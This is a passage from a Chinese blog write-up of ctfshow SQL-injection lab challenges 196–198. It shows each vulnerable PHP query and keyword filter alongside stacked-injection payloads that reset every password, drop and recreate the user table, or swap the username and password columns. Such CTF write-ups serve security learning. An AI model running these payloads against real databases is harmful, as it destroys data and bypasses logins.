data-num="18"></td><td><pre><span class="token punctuation">}</span></pre></td></tr></tbody></table></figure><p>可以使用修改表的方法</p><p>payload</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">update</span><span class="token identifier"><span class="token punctuation">`</span>ctfshow_user<span class="token punctuation">`</span></span><span class="token keyword">set</span><span class="token identifier"><span class="token punctuation">`</span>pass<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token number">1</span></pre></td></tr></tbody></table></figure><p>将密码重置为 1</p><h1 id="web-197"><a class="anchor" href="#web-197">#</a> web 197</h1><p>查询语句</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="2"></td><td><pre>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = {$username};"</span><span class="token punctuation">;</span></pre></td></tr></tbody></table></figure><p>返回逻辑</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/\*|\#\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i'</span><span class="token punctuation">,</span>$username<span class="token punctuation">)</span><span class="token punctuation">)</span>{</pre></td></tr><tr><td data-num="2"></td><td><pre>    $ret<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'用户名非法'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    die<span class="token punctuation">(</span>json_encode<span class="token punctuation">(</span>$ret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>}</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token keyword">row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">=</span> $password<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>{</pre></td></tr><tr><td data-num="8"></td><td><pre>    $ret<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"登陆成功 flag is $flag"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>}</pre></td></tr></tbody></table></figure><p>在这一题中，与前面相比过滤了 update，不能更新，分号还是可以用，即堆叠注入还是可以用，所以不妨直接删除表，然后创建相同名字、字段的表，而数据自己设置</p><p>因此 payload 为</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">drop</span> <span class="token keyword">table</span> ctfshow_user<span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">table</span> ctfshow_user<span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token identifier"><span class="token punctuation">`</span>pass<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> ctfshow_user<span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span><span class="token punctuation">,</span><span class="token identifier"><span class="token punctuation">`</span>pass<span class="token punctuation">`</span></span><span class="token punctuation">)</span> <span class="token keyword">value</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr></tbody></table></figure><h1 id="web-198"><a class="anchor" href="#web-198">#</a> web 198</h1><p>相比于 197 而言，将 <code>drop</code> 和 <code>create</code> 过滤了</p><p>这里可以使用交换列的方法 (前提是知道用户名是什么), 因为在交换了两列之后，查询语句就变为查询原来的 <code>pass</code> 列，而匹配的密码为原来的 <code>username</code> 列，而 <code>username</code> 是知道的，那么即可拿到 flag</p><p>payload</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">alter</span> <span class="token keyword">table</span> ctfshow_user change <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token identifier"><span class="token punctuation">`</span>pass2<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">alter</span> <span class="token keyword">table</span> ctfshow_user change <span class="token identifier"><span class="token punctuation">`</span>pass<span class="token punctuation">`</span></span> <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">alter</span> <span class="token keyword">table</span> ctfshow_user change <span class="token identifier"><span class="token punctuation">`</span>pass2<span class="token punctuation">`</span></span> <span class="token identifier"><span class="token punctuation">`</span>pass<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></tbody></table></figure><div class="tags"><a href="/tags/CTF/" rel="tag"><i class="ic i-tag"></i> CTF</a> <a href="/tags/ctfshow/" rel="tag"><i class="ic i-tag"></i> ctfshow</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2023-07-15 18:08:10" itemprop="dateModified" datetime="2023-07-15T18:08:10+08:00">2023-07-15</time> </span><span id="posts/35cb7ca5/" class="item leancloud_visitors" data-flag-title="SQL 注入" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="zhong 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="zhong 支付宝"><p>支付宝</p></div><div><img data-src="/images/paypal.png" alt="zhong 贝宝"><p>贝宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>zhong <i class="ic i-at"><em>@</em></i>dpm12345</li><li class="link"><strong>本文链接：</strong> <a href="http://dpm12345.cn/posts/35cb7ca5/" title="SQL 注入">http://dpm12345.cn/posts/35cb7ca5/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/posts/592e5fba/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63c56ad8be43e0d30e763875.png" title="文件上传"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Web 入门</span><h3>文件上传</h3></a></div><div class="item right"><a href="/posts/d3333ead/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63c5694dbe43e0d30e73c9ed.webp" title="反序列化"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> Web 入门</span><h3>反序列化</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web-171"><span class="toc-number">1.</span> <span class="toc-text">web 171</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-172"><span class="toc-number">2.</span> <span class="toc-text">web 172</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-173"><span class="toc-number">3.</span> <span class="toc-text">web 173</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-174"><span class="toc-number">4.</span> <span class="toc-text">web 174</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-175"><span class="toc-number">5.</span> <span class="toc-text">web 175</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-176"><span class="toc-number">6.</span> <span class="toc-text">web 176</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-177"><span class="toc-number">7.</span> <span class="toc-text">web 177</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-178"><span class="toc-number">8.</span> <span class="toc-text">web 178</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-179"><span class="toc-number">9.</span> <span class="toc-text">web 179</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-180"><span class="toc-number">10.</span> <span class="toc-text">web 180</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="toc-number">10.1.</span> <span class="toc-text">解法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-number">10.2.</span> <span class="toc-text">解法二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-181"><span class="toc-number">11.</span> <span class="toc-text">web 181</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-182"><span class="toc-number">12.</span> <span class="toc-text">web 182</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-183"><span class="toc-number">13.</span> <span class="toc-text">web 183</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-184"><span class="toc-number">14.</span> <span class="toc-text">web 184</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-185"><span class="toc-number">15.</span> <span class="toc-text">web 185</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-186"><span class="toc-number">16.</span> <span class="toc-text">web 186</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-187"><span class="toc-number">17.</span> <span class="toc-text">web 187</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-188"><span class="toc-number">18.</span> <span class="toc-text">web 188</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-189"><span class="toc-number">19.</span> <span class="toc-text">web 189</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-190"><span class="toc-number">20.</span> <span class="toc-text">web 190</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-191"><span class="toc-number">21.</span> <span class="toc-text">web 191</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-195"><span class="toc-number">22.</span> <span class="toc-text">web 195</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-197"><span class="toc-number">23.</span> <span class="toc-text">web 197</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-198"><span class="toc-number">24.</span> <span class="toc-text">web 198</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/posts/b013ba57/" rel="bookmark" title="信息收集 爆破 命令执行">信息收集 爆破 命令执行</a></li><li><a href="/posts/98069c85/" rel="bookmark" title="php 特性">php 特性</a></li><li><a href="/posts/31915a1e/" rel="bookmark" title="文件包含">文件包含</a></li><li><a href="/posts/592e5fba/" rel="bookmark" title="文件上传">文件上传</a></li><li class="active"><a href="/posts/35cb7ca5/" rel="bookmark" title="SQL 注入">SQL 注入</a></li><li><a href="/posts/d3333ead/" rel="bookmark" title="反序列化">反序列化</a></li><li><a href="/posts/9e150aa2/" rel="bookmark" title="代码审计">代码审计</a></li><li><a href="/posts/813434ca/" rel="bookmark" title="SSRF">SSRF</a></li><li><a href="/posts/7f1ae6d2/" rel="bookmark" title="java">java</a></li><li><a href="/posts/e93ac459/" rel="bookmark" title="XXE">XXE</a></li><li><a href="/posts/fe1aa8c3/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/posts/47d18edd/" rel="bookmark" title="SSTI">SSTI</a></li><li><a href="/posts/8d17cdf0/" rel="bookmark" title="jwt">jwt</a></li><li><a href="/posts/3418e521/" rel="bookmark" title="nodejs">nodejs</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="zhong" data-src="/images/avatar.jpg"><p class="name" itemprop="name">zhong</p><div class="description" itemprop="description">学习记录</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">99</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">14</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">50</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RwbTEyMzQ1" title="https:&#x2F;&#x2F;github.com&#x2F;dpm12345"><i class="ic i-github"></i></span> <span class="exturl item bilibili" data-url="aHR0cHM6Ly9zcGFjZS5iaWxpYmlsaS5jb20vMTQyNDc4NjIw" title="https:&#x2F;&#x2F;space.bilibili.com&#x2F;142478620"><i class="ic i-bilibili"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTUzMDc2NzE5NQ==" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;530767195"><i class="ic i-cloud-music"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/statistics/" rel="section"><i class="ic i-shuzhuangtu"></i>统计</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/posts/592e5fba/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/posts/d3333ead/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/leetcode/" title="分类于 leetcode">leetcode</a> <i class="ic i-angle-right"></i> <a href="/categories/leetcode/regular-exercise/" title="分类于 leetcode 刷题">leetcode 刷题</a></div><span><a href="/posts/308e5841/" title="有效的括号">有效的括号</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/posts/e28ceec1/" title="git学习">git学习</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/" title="分类于 ctfshow">ctfshow</a></div><span><a href="/posts/dd66f6b6/" title="萌新赛">萌新赛</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/principle/" title="分类于 CTF 原理">CTF 原理</a></div><span><a href="/posts/6882c75c/" title="JavaScript 原型链污染(Prototype).md">JavaScript 原型链污染(Prototype).md</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/" title="分类于 ctfshow">ctfshow</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/" title="分类于 Web 入门">Web 入门</a></div><span><a href="/posts/7f1ae6d2/" title="java">java</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/" title="分类于 ctfshow">ctfshow</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/" title="分类于 Web 入门">Web 入门</a></div><span><a href="/posts/d3333ead/" title="反序列化">反序列化</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/" title="分类于 ctfshow">ctfshow</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/" title="分类于 Web 入门">Web 入门</a></div><span><a href="/posts/9e150aa2/" title="代码审计">代码审计</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/posts/3b76a5dc/" title="宝塔的相关使用">宝塔的相关使用</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/" title="分类于 ctfshow">ctfshow</a></div><span><a href="/posts/524679b/" title="2023年CTF">2023年CTF</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/ctfshow/" title="分类于 ctfshow">ctfshow</a></div><span><a href="/posts/79d29fb/" title="菜狗杯">菜狗杯</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2021 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">zhong @ dpm12345-blog</span></div><script async src="../js/busuanzi.pure.min.js"></script><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">478k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">10:51</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div><i class="ic i-eye" aria-hidden="true"></i><span id="busuanzi_value_site_pv"></span>次</div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"posts/35cb7ca5/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js,npm/echarts@5.2.2/dist/echarts.min.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html>